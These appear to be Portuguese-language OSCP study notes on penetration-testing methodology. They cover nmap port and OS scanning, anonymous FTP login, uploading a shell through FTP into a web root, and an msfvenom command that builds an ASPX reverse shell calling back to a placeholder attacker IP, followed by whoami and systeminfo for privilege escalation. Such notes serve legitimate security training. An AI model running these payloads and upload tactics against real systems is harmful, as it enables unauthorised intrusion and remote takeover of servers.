Primeiro de tudo sempre começo com o reconhecimento de portas e serviços dos alvos:
  Missão: identificar TODAS as portas e serviços + versões de serviços rodando no alvo + possivel identificação do sistema operacional utilizado;
Comando:
  nmap -sCV -p- -Pn --open -O -T4 IP_DO_ALVO -oA arquivo_saida
    -sCV:roda os scripts default do nmap e identifica os processos com as versões utilizadas no alvo;
    -p-:Faz o scan em TODAS as portas do alvo
    -Pn:Não utiliza o protocolo ICMP (PING)
    --open:so retorna as portas com o estado ABERTA
    -O:procura pela identificação do Sistema Operacional do alvo
    -T4:maior velocidade do scan
    -oA:pega o resultado do scan e coloca em um arquivo de saida
Antes de começar a investigar (enumerar) as portas ativas no alvo, devemos tambem fazer uma varredura de portas UDP no alvo com o comando basico:
  comando:
    nmap -sU -O -oA nmap/udp IP_ALVO
Após isso começamos a ENUMERAR as portas encontradas. (tanto tcp quanto UDP) tudo que tiver porta e serviço identificado pode ser um possivel meio de entrada.

ENUMERAÇÃO:

Para enumerar os serviços aqui eu vou atualizando com o quanto de tecnologias eu irei pegando com o tempo, então PACIENCIA:

FTP:
ftp IP_ALVO
  user: anonymous
  pass: null / anonymous
---------------------------
http
podemos utilizar diversos comandos para enumeração http:
  curl --head Site
  nc Site porta
  ...
---------------------------

caso peguemos um ftp com servidor web trabalhando juntos, digo, com os arquivos do servidor web na pasta do ftp podemos incerir um arquivo para conseguir uma shell, caso nao
tenha essa possibilidade devemos pegar tudo de importante e analisar.

--------------------------------------------------------------------------

Produção de payload:
para qriar e gerar nossas shells reversas vamos utilizar muito o MSFVenom, é uma estrutura amplamene usada para a criação de payloads, 
para conseguir entender quais formatos podemos utilizar usamos o comando abaixo

msfvenom --list formats

msfvenom --list payloads | grep windows

como o objetivo aqui é preparação para oscp nao vou utilizar o meterpreter.

msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=IP_ATACANTE LPORT=4444 -o reverse-shell.aspx
  -p:payload
  -f:formato
  -LHOST:ip da maquina de ataque
  -LPORT:porta na qual vamos nos conectar
  -o:arquivo de saida
  --------------------------------------------------------------------------------
  
  conseguindo conectar com a shell  o alvo vamos bustar por informações de permissão:
    whoami - para identificar o usuario em que estamos
    systeminfo - para identificar as informações do sistema e com isso procurar por falhas na internet a fim de privesc
